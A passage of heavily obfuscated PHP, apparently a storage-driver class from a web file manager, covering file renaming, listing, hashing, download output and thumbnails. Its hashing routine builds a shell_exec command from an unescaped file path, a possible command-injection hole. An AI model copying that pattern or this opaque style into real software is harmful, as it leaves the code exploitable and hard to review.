$áÓˆéÛ• = '') { } public function renameObject($²À‰ñıÉ, $œ»ã÷´Å) { $é¹§•ú‰ =& $_SERVER[Á÷ ­Šë]; $´Øµ¶Üå = $œ»ã÷´Å; Hook::trigger($é¹§•ú‰[83], $this, $²À‰ñıÉ, $this, $this->pathFather($²À‰ñıÉ) . $œ»ã÷´Å); $²À‰ñıÉ = $this->getPathOuter($²À‰ñıÉ); $œ»ã÷´Å = $this->pathFather($²À‰ñıÉ) . $œ»ã÷´Å; if (IO::isFile($²À‰ñıÉ)) { $ëº¡¿ç½ = IO::copy($²À‰ñıÉ, $this->pathFather($²À‰ñıÉ), REPEAT_RENAME_FOLDER, $´Øµ¶Üå); if ($ëº¡¿ç½) { IO::remove($²À‰ñıÉ); } } else { $ëº¡¿ç½ = IO::mkdir($œ»ã÷´Å); if (!$ëº¡¿ç½) { return !1; } $êù½¸Ğå = IO::listPath($²À‰ñıÉ, !0); $„ùÀíô² = array_merge($êù½¸Ğå[$é¹§•ú‰[84]], $êù½¸Ğå[$é¹§•ú‰[85]]); foreach ($„ùÀíô² as $øúÊì‚î) { IO::move($øúÊì‚î[$é¹§•ú‰[86]], $œ»ã÷´Å, REPEAT_RENAME_FOLDER); } IO::remove($²À‰ñıÉ); } return $ëº¡¿ç½ ? $œ»ã÷´Å : !1; } public function tempFile($â²Àœ€÷ = '', $¤ÇÇåéã = '') { if (!$â²Àœ€÷) { $â²Àœ€÷ = rand_string(15); } $áŠ¾èº¸ = TEMP_FILES . rand_string(15) . $_SERVER[Á÷ ­Šë][8]; @mkdir($áŠ¾èº¸, DEFAULT_PERRMISSIONS, !0); $¦›»„´• = $áŠ¾èº¸ . $â²Àœ€÷; @touch($¦›»„´•); if ($¤ÇÇåéã) { file_put_contents($¦›»„´•, $¤ÇÇåéã); } return $¦›»„´•; } public function tempFileRemve($Ò³›øé¾) { @unlink($Ò³›øé¾); @rmdir($this->pathFather($Ò³›øé¾)); } public function mkfile($Ã¼¼¡Â, $–ñóš¸ = '', $‘âºÏüô = REPEAT_RENAME) { } public function mkdir($’Ö£ÂÃ, $¾˜àÜÑÖ = REPEAT_SKIP) { } public function delFile($¬ÄÉ‘—Ì) { } public function delFolder($˜¼ ˆÏ˜) { } public function copyFile($ÒÒ«ÇÃ, $î°àÛáÚ) { } public function moveFile($³¶‹µù, $¶îàÎÙ‰) { } public function remove($šÙßßî) { if ($this->isFile($šÙßßî)) { return $this->delFile($šÙßßî); } return $this->delFolder($šÙßßî); } public function rename($§Õ¢ØìÈ, $¬½•³ß¶) { } public function exist($®Óê¾Í¥) { } public function findByHash($«ıéÜ¶æ = '', $âñé°Ë = '') { return !1; } public function isFile($½ú’»˜¶) { } public function isFolder($şÖîÜß) { } public function size($¼çØ¢) { } public function info($»¨¼Ç„¢) { } public function infoSimple($è–öµÆ) { return $this->info($è–öµÆ); } public function infoAuth($ÅİÙÀ´Ò) { return $this->info($ÅİÙÀ´Ò); } public function infoFull($¦¼¯é) { return $this->info($¦¼¯é); } public function infoWithChildren($Ñ€º§ö) { $“È´‡ÇÉ =& $_SERVER[Á÷ ­Šë]; static $ã½ñú„å = array(); if (isset($ã½ñú„å[$Ñ€º§ö])) { return $ã½ñú„å[$Ñ€º§ö]; } $Ğî…¨ºÖ = $this->info($Ñ€º§ö); if ($Ğî…¨ºÖ && $Ğî…¨ºÖ[$“È´‡ÇÉ[29]] == $“È´‡ÇÉ[87]) { $ÍòŞ·Âá = array($“È´‡ÇÉ[88] => 0, $“È´‡ÇÉ[89] => 0, $“È´‡ÇÉ[90] => 0); $this->infoChildren($Ñ€º§ö, $ÍòŞ·Âá); $Ğî…¨ºÖ[$“È´‡ÇÉ[88]] = $ÍòŞ·Âá[$“È´‡ÇÉ[88]]; $Ğî…¨ºÖ[$“È´‡ÇÉ[91]] = array($“È´‡ÇÉ[92] => $ÍòŞ·Âá[$“È´‡ÇÉ[89]], $“È´‡ÇÉ[93] => $ÍòŞ·Âá[$“È´‡ÇÉ[90]]); $ã½ñú„å[$Ñ€º§ö] = $Ğî…¨ºÖ; } return $Ğî…¨ºÖ; } public function listPath($ÇÏŞÇö©, $äÛ²’Â = false) { } public function has($ü®ùØîÖ, $«ùÙÉÕƒ = false, $ÖşÀ¶¦¤ = false) { } public function canRead($ĞòÀ¥¯…) { } public function canWrite($ìÈÄ³÷¨) { } public function getContent($í¦ß˜ú†) { } public function setContent($³Øˆ’¬¾, $óö‚£İ = '') { } protected function infoChildren($ÏÈÎ‚†©, &$Œ±æñúá) { $­Âá‰…á =& $_SERVER[Á÷ ­Šë]; check_abort_echo(); $î˜âŞ© = $this->listPath($ÏÈÎ‚†©, !0); $î˜âŞ© = array_merge($î˜âŞ©[$­Âá‰…á[85]], $î˜âŞ©[$­Âá‰…á[84]]); foreach ($î˜âŞ© as $Ê…İè¾ê) { if ($Ê…İè¾ê[$­Âá‰…á[29]] == $­Âá‰…á[87]) { $Œ±æñúá[$­Âá‰…á[90]]++; $×ö¹«ƒ¯ = $this->getPathInner($Ê…İè¾ê[$­Âá‰…á[86]]); $this->infoChildren($×ö¹«ƒ¯, $Œ±æñúá); } else { $Œ±æñúá[$­Âá‰…á[89]]++; $Œ±æñúá[$­Âá‰…á[88]] += $Ê…İè¾ê[$­Âá‰…á[88]]; } } } public function fileSubstr($¤„Ë³Êä, $Ÿ ¸¬Ãš, $³õÎç–) { } public function listAll($±ˆË­ˆ©) { } public function listAllMake($‹ç»Å€§, &$’Öœ­Ï) { $²Ò·ŠÔÂ =& $_SERVER[Á÷ ­Šë]; check_abort_echo(); $Ïã¸¹° = $this->listPath($‹ç»Å€§, !0); if (!$Ïã¸¹°) { return; } $ÂŠ¿‰ùå = array_merge($Ïã¸¹°[$²Ò·ŠÔÂ[85]], $Ïã¸¹°[$²Ò·ŠÔÂ[84]]); foreach ($ÂŠ¿‰ùå as $ïò£ï‡) { $‘«›°¾ = $ïò£ï‡[$²Ò·ŠÔÂ[29]] == $²Ò·ŠÔÂ[87]; $øü„¶› = array($²Ò·ŠÔÂ[86] => $ïò£ï‡[$²Ò·ŠÔÂ[86]], $²Ò·ŠÔÂ[87] => $‘«›°¾); if (isset($ïò£ï‡[$²Ò·ŠÔÂ[88]])) { $øü„¶›[$²Ò·ŠÔÂ[88]] = $ïò£ï‡[$²Ò·ŠÔÂ[88]]; } if (isset($ïò£ï‡[$²Ò·ŠÔÂ[94]])) { $øü„¶›[$²Ò·ŠÔÂ[94]] = $ïò£ï‡[$²Ò·ŠÔÂ[94]]; } if (!$‘«›°¾) { $’Öœ­Ï[] = $øü„¶›; continue; } $’Öœ­Ï[] = $øü„¶›; $ÇÓüÄô÷ = $ïò£ï‡[$²Ò·ŠÔÂ[86]]; $ıÛĞÖç  = $this->pathDriver; if (substr($ïò£ï‡[$²Ò·ŠÔÂ[86]], 0, strlen($ıÛĞÖç )) == $ıÛĞÖç ) { $ÇÓüÄô÷ = substr($ÇÓüÄô÷, strlen($ıÛĞÖç )); } $this->listAllMake($ÇÓüÄô÷, $’Öœ­Ï); } } public function listAllSimple($şî¤ œé) { $³æ²’äÖ =& $_SERVER[Á÷ ­Šë]; $‰¢ÍÖÃ = array(); $ĞÓ¨®õ» = $this->listAll($şî¤ œé); $óØ÷İÁ¢ = $this->getPathOuter($şî¤ œé); foreach ($ĞÓ¨®õ» as $ ÈÜ‰¡) { $ÒºÌüÛâ = $ ÈÜ‰¡[$³æ²’äÖ[86]]; $ò¬Ú¹öÙ = $ ÈÜ‰¡[$³æ²’äÖ[86]]; if (isset($ ÈÜ‰¡[$³æ²’äÖ[95]])) { $ÒºÌüÛâ = $ ÈÜ‰¡[$³æ²’äÖ[95]][$³æ²’äÖ[86]]; $ ÈÜ‰¡[$³æ²’äÖ[88]] = $ ÈÜ‰¡[$³æ²’äÖ[95]][$³æ²’äÖ[88]]; $ ÈÜ‰¡[$³æ²’äÖ[94]] = $ ÈÜ‰¡[$³æ²’äÖ[95]][$³æ²’äÖ[94]]; } else { $ò¬Ú¹öÙ = substr($ ÈÜ‰¡[$³æ²’äÖ[86]], strlen(get_path_father($óØ÷İÁ¢))); $ò¬Ú¹öÙ = $³æ²’äÖ[8] . ltrim($ò¬Ú¹öÙ, $³æ²’äÖ[8]); } $ÓË–®¿ê = array($³æ²’äÖ[86] => $ò¬Ú¹öÙ, $³æ²’äÖ[87] => $ ÈÜ‰¡[$³æ²’äÖ[87]]); if (isset($ ÈÜ‰¡[$³æ²’äÖ[88]]) && !$ ÈÜ‰¡[$³æ²’äÖ[87]]) { $ÓË–®¿ê[$³æ²’äÖ[88]] = $ ÈÜ‰¡[$³æ²’äÖ[88]]; } if (isset($ ÈÜ‰¡[$³æ²’äÖ[94]])) { $ÓË–®¿ê[$³æ²’äÖ[94]] = $ ÈÜ‰¡[$³æ²’äÖ[94]]; } if (!$ ÈÜ‰¡[$³æ²’äÖ[87]]) { $ÓË–®¿ê[$³æ²’äÖ[96]] = $ÒºÌüÛâ; } $‰¢ÍÖÃ[] = $ÓË–®¿ê; } return $‰¢ÍÖÃ; } public function upload($â’½Ú, $ˆ÷ÏÔğ, $óİ‡¡Ìü = false, $ÉÜ«ŠÇö = REPEAT_REPLACE) { } public function uploadFileByID($äÕÓºƒ­, $‡€ÔõÊ, $ËçÌŸÂô) { } public function uploadFileByPath($ßáÙìÏß, $ôœù”ó§, $šºì÷†‡ = array()) { } public function isUploadServer() { $Ãè‡ŠÎ¥ =& $_SERVER[Á÷ ­Šë]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ãè‡ŠÎ¥[97]) { return !0; } return $GLOBALS[$Ãè‡ŠÎ¥[6]][$Ãè‡ŠÎ¥[98]][$Ãè‡ŠÎ¥[99]]; } public function isFileOutServer() { $ÙË¾ïÇµ =& $_SERVER[Á÷ ­Šë]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ÙË¾ïÇµ[97]) { return !0; } return $GLOBALS[$ÙË¾ïÇµ[6]][$ÙË¾ïÇµ[98]][$ÙË¾ïÇµ[100]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($”ºÁ¿Ò ) { $Şğù×¨‚ =& $_SERVER[Á÷ ­Šë]; if (!$this->isCdnHost()) { return $”ºÁ¿Ò ; } return str_replace(trim(get_url_root($”ºÁ¿Ò ), $Şğù×¨‚[8]), trim($this->cdnHost, $Şğù×¨‚[8]), $”ºÁ¿Ò ); } public function uploadLink($Ù©ñô››, $Àè“¼Æ¨ = 0) { $¼­Ï«é² =& $_SERVER[Á÷ ­Šë]; if ($this->isUploadServer()) { return; } $ÒŠ³©âŞ = $this->getType(); if (!in_array($ÒŠ³©âŞ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $›·ÛØ½ = 1024 * 1024 * 10; $Ôã’ÃÅ× = $Àè“¼Æ¨ <= $›·ÛØ½ ? $¼­Ï«é²[101] : $¼­Ï«é²[102]; $ÓÜ§È = (!$Àè“¼Æ¨ ? 1 : ceil($Àè“¼Æ¨ / pow(1024, 3))) * 3600 * 4; $ëØù²˜  = $this->{$Ôã’ÃÅ×}($Ù©ñô››, $ÓÜ§È); if ($ëØù²˜ ) { $ëØù²˜ [$¼­Ï«é²[103]] = $Ù©ñô››; $ëØù²˜ [$¼­Ï«é²[104]] = $ÒŠ³©âŞ; } return $ëØù²˜ ; } public function uploadFormData($ÛÔÌ¯, $³ª¦ıöş = 3600) { } public function multiUploadFormData($§…˜Ô”, $·ìÍ”Áø = 3600) { } public function download($êÎê§È—, $Œæ¿Š“¼) { } public function ext($ÃªÚ‘Ü™) { $Ú‰Öæ‰ë =& $_SERVER[Á÷ ­Šë]; if (strpos($ÃªÚ‘Ü™, $Ú‰Öæ‰ë[8]) === -1) { $¥ô­¨ = $ÃªÚ‘Ü™; } else { $¥ô­¨ = $this->pathThis($ÃªÚ‘Ü™); } $¬å×¯Í© = $Ú‰Öæ‰ë[33]; if (strstr($¥ô­¨, $Ú‰Öæ‰ë[105])) { $¬å×¯Í© = substr($¥ô­¨, strrpos($¥ô­¨, $Ú‰Öæ‰ë[105]) + 1); $¬å×¯Í© = strtolower($¬å×¯Í©); } if (strlen($¬å×¯Í©) > 3 && preg_match($Ú‰Öæ‰ë[106], $¬å×¯Í©, $ñ€¶—Î¦)) { $¬å×¯Í© = $Ú‰Öæ‰ë[33]; } return $¬å×¯Í©; } public function pathThis($ëÑÍ‘‘ç) { $³ğ…à«” =& $_SERVER[Á÷ ­Šë]; $ëÑÍ‘‘ç = str_replace($³ğ…à«”[107], $³ğ…à«”[8], rtrim($ëÑÍ‘‘ç, $³ğ…à«”[8])); $×Òş•”İ = strrpos($ëÑÍ‘‘ç, $³ğ…à«”[8]); if ($×Òş•”İ === !1) { return $ëÑÍ‘‘ç; } return substr($ëÑÍ‘‘ç, $×Òş•”İ + 1); } public function pathFather($èú£á‰Ü) { $†å´Ãöö =& $_SERVER[Á÷ ­Šë]; $èú£á‰Ü = str_replace($†å´Ãöö[107], $†å´Ãöö[8], rtrim($èú£á‰Ü, $†å´Ãöö[8])); $Œ¼ñÇ£› = strrpos($èú£á‰Ü, $†å´Ãöö[8]); if ($Œ¼ñÇ£› === !1) { return $†å´Ãöö[33]; } return substr($èú£á‰Ü, 0, $Œ¼ñÇ£› + 1); } public function hashSimple($«û°Ÿ²Ï) { $Ç¢ÖçÃÄ =& $_SERVER[Á÷ ­Šë]; if (!$«û°Ÿ²Ï) { return md5($Ç¢ÖçÃÄ[33]); } $×ƒ±å ß = $this->size($«û°Ÿ²Ï); $ÌæìÏ¨Ê = 200; $Ú€£ø¡Ç = 50; if ($×ƒ±å ß <= $ÌæìÏ¨Ê * $Ú€£ø¡Ç) { return $this->hashMd5($«û°Ÿ²Ï) . $×ƒ±å ß; } $Ø«Ç¨ä = intval($×ƒ±å ß / $Ú€£ø¡Ç); $Ìë¼ˆ‘‹ = $Ç¢ÖçÃÄ[33]; for ($¿ Íªºû = 0; $¿ Íªºû < $Ú€£ø¡Ç; $¿ Íªºû++) { $Ìë¼ˆ‘‹ .= $this->fileSubstr($«û°Ÿ²Ï, $Ø«Ç¨ä * $¿ Íªºû, $ÌæìÏ¨Ê); } $Ìë¼ˆ‘‹ .= $this->fileSubstr($«û°Ÿ²Ï, $×ƒ±å ß - $ÌæìÏ¨Ê, $ÌæìÏ¨Ê); return md5($Ìë¼ˆ‘‹) . $×ƒ±å ß; } public static $md5Cache = array(); public function hashMd5($¤şå»ëÌ) { if (!$¤şå»ëÌ) { return md5($_SERVER[Á÷ ­Šë][33]); } $¤şå»ëÌ = $this->iconvSystem($¤şå»ëÌ); if (isset(self::$md5Cache[$¤şå»ëÌ])) { return self::$md5Cache[$¤şå»ëÌ]; } self::$md5Cache[$¤şå»ëÌ] = $this->hashMd5Shell($¤şå»ëÌ); if (!self::$md5Cache[$¤şå»ëÌ]) { self::$md5Cache[$¤şå»ëÌ] = @md5_file($¤şå»ëÌ); } return self::$md5Cache[$¤şå»ëÌ]; } private function hashMd5Shell($«Åå¹Ô•) { $Ìä¢°¨¤ =& $_SERVER[Á÷ ­Šë]; if (!$«Åå¹Ô•) { return md5($Ìä¢°¨¤[33]); } if (!function_exists($Ìä¢°¨¤[108])) { return !1; } $œ¨Ô¬Š¾ = array($Ìä¢°¨¤[109], $Ìä¢°¨¤[110]); $‘´×á‡ = Cache::get($Ìä¢°¨¤[111]); if (!$‘´×á‡) { $¢°‚»ÈÊ = BASIC_PATH . $Ìä¢°¨¤[112]; $å‹ˆ¹ö¿ = md5_file($¢°‚»ÈÊ); $‘´×á‡ = $Ìä¢°¨¤[113]; foreach ($œ¨Ô¬Š¾ as $„–³íƒ) { $µ×“Õı = shell_exec($„–³íƒ . "\40\42{$¢°‚»ÈÊ}\42"); if ($µ×“Õı && substr(trim($µ×“Õı), 0, 32) == $å‹ˆ¹ö¿) { $‘´×á‡ = $„–³íƒ; break; } } Cache::set($Ìä¢°¨¤[111], $‘´×á‡, 3600); } if ($‘´×á‡ == $Ìä¢°¨¤[113]) { return !1; } $µ×“Õı = shell_exec($‘´×á‡ . "\40\42{$«Åå¹Ô•}\x22"); $µ×“Õı = str_replace($Ìä¢°¨¤[114], $Ìä¢°¨¤[33], $µ×“Õı); return substr($µ×“Õı, 0, 32); } public function link($„ùØÄ–Ü) { return $„ùØÄ–Ü; } public function fileOut($îİËüÙ, $İú¿Ôã = false, $×ú´©Û½ = false, $÷‚‡Ç¼› = '') { $¢·×§œ =& $_SERVER[Á÷ ­Šë]; $this->cacheMethod(null, null); if (!$îİËüÙ || !$this->exist($îİËüÙ)) { show_json(LNG($¢·×§œ[115]), !1, $×ú´©Û½); } $¹Š‘ÖÅ = $this->getType() == $¢·×§œ[116]; $²—æ–Şñ = $GLOBALS[$¢·×§œ[6]][$¢·×§œ[98]][$¢·×§œ[117]][$¢·×§œ[118]]; $ÍÇ´êç  = (double) $GLOBALS[$¢·×§œ[6]][$¢·×§œ[98]][$¢·×§œ[117]][$¢·×§œ[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¬“«±ÛŠ = $this->infoFull($îİËüÙ); $Ç—¡Ùâå = $¬“«±ÛŠ[$¢·×§œ[88]]; $Ù¯ä¸Êœ = gmdate($¢·×§œ[120], $¬“«±ÛŠ[$¢·×§œ[94]]); $—ûˆóèü = $×ú´©Û½ ? $×ú´©Û½ : $this->iconvApp($¬“«±ÛŠ[$¢·×§œ[28]]); $ùì™ÑÔ = 0; $È½Éª· = $Ç—¡Ùâå - 1; $Ãâ‰Ü‘ = $this->ext($—ûˆóèü); if (in_array($Ãâ‰Ü‘, array($¢·×§œ[121], $¢·×§œ[122], $¢·×§œ[123], $¢·×§œ[124]))) { $Ãâ‰Ü‘ = $¢·×§œ[125]; } if (!$÷‚‡Ç¼›) { $÷‚‡Ç¼› = md5($Ù¯ä¸Êœ . $this->hashSimple($îİËüÙ)); } $÷‚‡Ç¼› = $¢·×§œ[126] . $÷‚‡Ç¼› . $¢·×§œ[126]; $ÔÌã°¨ = get_file_mime($Ãâ‰Ü‘); if (strstr($ÔÌã°¨, $¢·×§œ[127])) { $ÔÌã°¨ = $ÔÌã°¨ . $¢·×§œ[128]; } if ($İú¿Ôã === !1 && !mime_support($ÔÌã°¨)) { $İú¿Ôã = !0; $ÔÌã°¨ = $¢·×§œ[129]; } header($¢·×§œ[130]); header($¢·×§œ[131] . $ÔÌã°¨); $ˆ”Ã£ûå = rawurlencode($—ûˆóèü); $ˆ”Ã£ûå = $¢·×§œ[126] . $ˆ”Ã£ûå . $¢·×§œ[132] . $ˆ”Ã£ûå; if ($İú¿Ôã) { header($¢·×§œ[133]); header($¢·×§œ[134] . $ˆ”Ã£ûå); } else { header($¢·×§œ[135] . $ˆ”Ã£ûå); } header($¢·×§œ[136] . gmdate($¢·×§œ[120], time() + 3600 * 24 * 30) . $¢·×§œ[137]); header($¢·×§œ[138]); header($¢·×§œ[139]); header($¢·×§œ[140]); if (isset($_SERVER[$¢·×§œ[141]]) && strtotime($_SERVER[$¢·×§œ[141]]) == $¬“«±ÛŠ[$¢·×§œ[94]]) { header($¢·×§œ[142], !0, 304); die; } if (isset($_SERVER[$¢·×§œ[143]]) && $_SERVER[$¢·×§œ[143]] == $÷‚‡Ç¼›) { header($¢·×§œ[144] . $÷‚‡Ç¼›, !0, 304); die; } header($¢·×§œ[144] . $÷‚‡Ç¼›); header($¢·×§œ[145] . $Ù¯ä¸Êœ . $¢·×§œ[137]); header($¢·×§œ[146] . $—ûˆóèü); header($¢·×§œ[147]); header($¢·×§œ[148] . $Ç—¡Ùâå); header($¢·×§œ[149]); if (!$İú¿Ôã && $Ãâ‰Ü‘ == $¢·×§œ[150]) { if ($Ç—¡Ùâå > 1024 * 1024 * 5) { die; } $ÙÈ¨¾† = $this->getContent($îİËüÙ); $ÙÈ¨¾† = Html::clearSVG($ÙÈ¨¾†); header($¢·×§œ[151] . strlen($ÙÈ¨¾†)); echo $ÙÈ¨¾†; die; } $Ÿ¨šä¯ = strtolower($_SERVER[$¢·×§œ[152]]); if ($¹Š‘ÖÅ && $Ÿ¨šä¯ && $²—æ–Şñ) { if (strstr($Ÿ¨šä¯, $¢·×§œ[153])) { header($¢·×§œ[154] . $îİËüÙ); } else { if (strstr($Ÿ¨šä¯, $¢·×§œ[155])) { header($¢·×§œ[156] . $îİËüÙ); } else { if (strstr($Ÿ¨šä¯, $¢·×§œ[157])) { header($¢·×§œ[158] . $îİËüÙ); } } } if ($ÍÇ´êç ) { header($¢·×§œ[159] . $ÍÇ´êç ); } return; } if (isset($_SERVER[$¢·×§œ[160]])) { if (preg_match($¢·×§œ[161], $_SERVER[$¢·×§œ[160]], $ÁÄƒ„—ş)) { $ùì™ÑÔ = intval($ÁÄƒ„—ş[1]); if (!empty($ÁÄƒ„—ş[2])) { $È½Éª· = intval($ÁÄƒ„—ş[2]); } } header($¢·×§œ[162]); header("\103\x6f\x6e\164\x65\x6e\x74\x2d\x52\x61\156\x67\x65\72\40\142\x79\164\145\163\x20{$ùì™ÑÔ}\x2d{$È½Éª·}\57" . $Ç—¡Ùâå); } else { header($¢·×§œ[163]); } $‡ú¨Ñœé = !0; if ($_SERVER[$¢·×§œ[164]] == $¢·×§œ[165] && $Ç—¡Ùâå > 1204 * 1024 * 1024 * 2) { $‡ú¨Ñœé = !1; } if ($‡ú¨Ñœé) { header($¢·×§œ[166] . ($È½Éª· - $ùì™ÑÔ + 1)); } if ($_SERVER[$¢·×§œ[167]] == $¢·×§œ[168]) { return; } $ŠÇà÷¿Í = 1024 * 100; $ÄÜÅƒá‡ = 0; if ($ÍÇ´êç ) { $ÄÜÅƒá‡ = intval(1000 * 1000 * ($ŠÇà÷¿Í / $ÍÇ´êç )); } while ($ùì™ÑÔ <= $È½Éª·) { $–˜¸‚Ì = timeFloat(); check_abort(); $¬è¶÷„— = $È½Éª· - $ùì™ÑÔ + 1; if ($¬è¶÷„— <= $ŠÇà÷¿Í) { $ŠÇà÷¿Í = $¬è¶÷„—; } echo $this->fileSubstr($îİËüÙ, $ùì™ÑÔ, $ŠÇà÷¿Í); $ùì™ÑÔ += $ŠÇà÷¿Í; if ($ŠÇà÷¿Í == $¬è¶÷„—) { $ùì™ÑÔ = $È½Éª· + 1; } if ($ÄÜÅƒá‡) { $ç­ÆÑ æ = intval(1000 * 1000 * (timeFloat() - $–˜¸‚Ì)); $óÌµ¿È = $ÄÜÅƒá‡ - $ç­ÆÑ æ; if ($óÌµ¿È > 5) { usleep($óÌµ¿È); } } } } public function fileOutServer($œÛ¢ÄÀ, $¤ƒø®¶ = false, $«ç€î­¾ = false, $Ä²èı‚¡ = '') { $this->fileOut($œÛ¢ÄÀ, $¤ƒø®¶, $«ç€î­¾, $Ä²èı‚¡); } public function fileOutLink($ØÀ¶ù²ò) { header($_SERVER[Á÷ ­Šë][169] . $ØÀ¶ù²ò); die; } public function cacheMethod($Ù“ü¸áÅ, $²³ÜÅì¨, $”‰Îá™À = null) { $Şò¶¬òœ =& $_SERVER[Á÷ ­Šë]; static $Ï‡¼ºÂ¾ = array(); $ÓÙı¤²Ò = $²³ÜÅì¨ ? ltrim($this->getPathOuter($²³ÜÅì¨), $Şò¶¬òœ[8]) : $²³ÜÅì¨; $°¿âÉêÌ = $Şò¶¬òœ[170] . $Ù“ü¸áÅ . $Şò¶¬òœ[171] . rtrim($ÓÙı¤²Ò, $Şò¶¬òœ[8]); if (is_null($Ù“ü¸áÅ)) { $Ï‡¼ºÂ¾ = array(); return; } if (is_null($²³ÜÅì¨)) { unset($Ï‡¼ºÂ¾[$°¿âÉêÌ]); return; } if (!is_null($”‰Îá™À)) { $Ï‡¼ºÂ¾[$°¿âÉêÌ] = $”‰Îá™À; return; } $è»÷³®Ã = isset($Ï‡¼ºÂ¾[$°¿âÉêÌ]) ? $Ï‡¼ºÂ¾[$°¿âÉêÌ] : null; if (!is_null($è»÷³®Ã)) { return $è»÷³®Ã; } $è»÷³®Ã = $this->{$Ù“ü¸áÅ}($²³ÜÅì¨); $Ï‡¼ºÂ¾[$°¿âÉêÌ] = $è»÷³®Ã; return $è»÷³®Ã; } public function fileOutImage($†Œ•õãù, $â¿áó¤ = 250) { $™ËïÈ· =& $_SERVER[Á÷ ­Šë]; set_timeout(); if (substr($†Œ•õãù, 0, 4) == $™ËïÈ·[157]) { $this->fileOutLink($†Œ•õãù); } $éáÅåôŞ = $this->info($†Œ•õãù); $İÃÁÑ©Á = $éáÅåôŞ[$™ËïÈ·[28]]; $»ï¼¸õ = !1; if (isset($GLOBALS[$™ËïÈ·[172]]) && $GLOBALS[$™ËïÈ·[172]][$™ËïÈ·[86]] == $éáÅåôŞ[$™ËïÈ·[86]]) { $·íä´€Š = $GLOBALS[$™ËïÈ·[172]][$™ËïÈ·[173]]; if (!$éáÅåôŞ[$™ËïÈ·[174]]) { $éáÅåôŞ[$™ËïÈ·[174]] = $GLOBALS[$™ËïÈ·[172]]; } if (isset($·íä´€Š[$™ËïÈ·[175]])) { if ($·íä´€Š[$™ËïÈ·[175]] <= $â¿áó¤ && $·íä´€Š[$™ËïÈ·[176]] <= $â¿áó¤) { $»ï¼¸õ = !0; } } $İÃÁÑ©Á = $éáÅåôŞ[$™ËïÈ·[174]][$™ËïÈ·[28]]; } if ($éáÅåôŞ[$™ËïÈ·[88]] <= 1024 * 50 || $»ï¼¸õ || !function_exists($™ËïÈ·[177]) || $éáÅåôŞ[$™ËïÈ·[178]] == $™ËïÈ·[179]) { return $this->fileOut($†Œ•õãù, !1, $İÃÁÑ©Á); } if (isset($éáÅåôŞ[$™ËïÈ·[174]][$™ËïÈ·[180]])) { $ìéßÀ = $éáÅåôŞ[$™ËïÈ·[174]][$™ËïÈ·[180]]; } else { if (isset($éáÅåôŞ[$™ËïÈ·[174]][$™ËïÈ·[181]])) { $ìéßÀ = $éáÅåôŞ[$™ËïÈ·[174]][$™ËïÈ·[181]]; } else { $ìéßÀ = md5("{$éáÅåôŞ[$™ËïÈ·[28]]}\137{$éáÅåôŞ[$™ËïÈ·[86]]}\137{$éáÅåôŞ[$™ËïÈ·[88]]}"); } } $°âÛô»« = "{$ìéßÀ}\137{$â¿áó¤}\56\x70\x6e\147"; if (!($–Íìƒ€ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $™ËïÈ·[182]))) { $å€ÒÙñÊ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $™ËïÈ·[183]); } else { $å€ÒÙñÊ = KodIO::make($–Íìƒ€); } if ($–Íìƒ€ = IO::fileNameExist($å€ÒÙñÊ, $°âÛô»«)) { $´Ş«í×® = KodIO::make($–Íìƒ€); return IO::fileOut($´Ş«í×®, !1, $İÃÁÑ©Á); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $´Ş«í×® = DATA_THUMB . $°âÛô»«; del_file($´Ş«í×®); if (!@file_exists($´Ş«í×®)) { $“Æ¬ˆˆÊ = TEMP_FILES; if (!is_dir($“Æ¬ˆˆÊ)) { mk_dir($“Æ¬ˆˆÊ); } $·åïúï¥ = $“Æ¬ˆˆÊ . $ìéßÀ . $™ËïÈ·[105] . $éáÅåôŞ[$™ËïÈ·[178]]; if (!@file_exists($·åïúï¥)) { $·åïúï¥ = $this->download($†Œ•õãù, $·åïúï¥); } ImageThumb::createThumb($·åïúï¥, $´Ş«í×®, $â¿áó¤, $â¿áó¤ * 10); } if (!file_exists($´Ş«í×®) || filesize($´Ş«í×®) < 100) { return @file_exists($·åïúï¥) ? IO::fileOut($·åïúï¥) : $this->fileOut($†Œ•õãù); } if (!($šÆ©»û‚ = IO::move($´Ş«í×®, $å€ÒÙñÊ))) { return IO::fileOut($´Ş«í×®); } del_file($´Ş«í×®); IO::fileOut($šÆ©»û‚); } public function fileOutImageServer($ˆĞÅ”„µ, $ù¿è‰Œë = 250) { $this->fileOutImage($ˆĞÅ”„µ, $ù¿è‰Œë); } public function fileNameAuto($Ïè™„£à, $•Š¡ÓË’, $éíÄúêƒ = REPEAT_RENAME, $¿±¶å»Ì = false) { $ê³üšÛ =& $_SERVER[Á÷ ­Šë]; $¡ÈäœÔê = $Ïè™„£à === $ê³üšÛ[33] ? $•Š¡ÓË’ : rtrim($Ïè™„£à, $ê³üšÛ[8]) . $ê³üšÛ[8] . $•Š¡ÓË’; if ($éíÄúêƒ == REPEAT_REPLACE || !$this->exist($¡ÈäœÔê) || $¿±¶å»Ì && $éíÄúêƒ != REPEAT_RENAME_FOLDER) { return $•Š¡ÓË’; } if ($éíÄúêƒ == REPEAT_SKIP) { return !1; } $Â¤ÑäÍ¢ = $ê³üšÛ[105] . get_path_ext($•Š¡ÓË’); $Â¤ÑäÍ¢ = $Â¤ÑäÍ¢ == $ê³üšÛ[105] || $¿±¶å»Ì ? $ê³üšÛ[33] : $Â¤ÑäÍ¢; $Àß¥ñ¦ = 1; $Óïü£® = substr($•Š¡ÓË’, 0, strlen($•Š¡ÓË’) - strlen($Â¤ÑäÍ¢)); $Ôğ‰’ıú = $Óïü£® . "\50{$Àß¥ñ¦}\x29{$Â¤ÑäÍ¢}"; while ($this->exist(rtrim($Ïè™„£à, $ê³üšÛ[8]) . $ê³üšÛ[8] . $Ôğ‰’ıú)) { $Ôğ‰’ıú = $Óïü£® . "\50{$Àß¥ñ¦}\51{$Â¤ÑäÍ¢}"; $Àß¥ñ¦++; } return $Ôğ‰’ıú; } private function fileNameAutoList($¿¿ù¢‘, $üÆïŞ¼µ, $ÇØËµ½Ã = false) { $›¹¶‰·Ø =& $_SERVER[Á÷ ­Šë]; $øùÕºó = $this->listPath($¿¿ù¢‘, !0); $øùÕºó = array_merge($øùÕºó[$›¹¶‰·Ø[85]], 